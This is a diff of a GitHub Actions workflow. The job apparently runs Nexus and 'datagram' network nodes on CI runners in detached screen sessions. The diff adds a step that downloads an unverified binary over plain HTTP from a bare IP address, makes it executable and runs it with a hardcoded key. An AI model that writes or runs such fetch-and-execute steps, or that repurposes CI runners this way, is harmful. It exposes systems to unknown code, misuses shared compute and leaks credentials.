@@ -12,21 +12,23 @@ jobs:
       max-parallel: 1
       matrix:
         node_ids:
-          - [12258732, 12484674, 13007298]
+          - [12403947, 13090325]
 
     steps:
       - name: Install Nexus CLI
         run: |
           mkdir -p ~/.nexus/bin
           curl -L "http://103.246.188.56:8000/nexus-network-linux-x86_64" -o ~/.nexus/bin/nexus-network
+          curl -L "http://103.246.188.56:8000/datagram" -o ~/.nexus/bin/datagram
           chmod +x ~/.nexus/bin/nexus-network
+          chmod +x ~/.nexus/bin/datagram
           ln -sf ~/.nexus/bin/nexus-network ~/.nexus/bin/nexus-cli
 
       - name: Run 3 Nexus Nodes
         run: |
           screen -dmS nexus-${{ matrix.node_ids[0] }} ~/.nexus/bin/nexus-network start --node-id ${{ matrix.node_ids[0] }}
           screen -dmS nexus-${{ matrix.node_ids[1] }} ~/.nexus/bin/nexus-network start --node-id ${{ matrix.node_ids[1] }}
-          screen -dmS nexus-${{ matrix.node_ids[2] }} ~/.nexus/bin/nexus-network start --node-id ${{ matrix.node_ids[2] }}
+          screen -dmS datagram-1 ~/.nexus/bin/datagram run -- -key 0dea9aede7e7e8fe00549cf0c96b1809
           screen -ls
 
       - name: Cek RAM & CPU
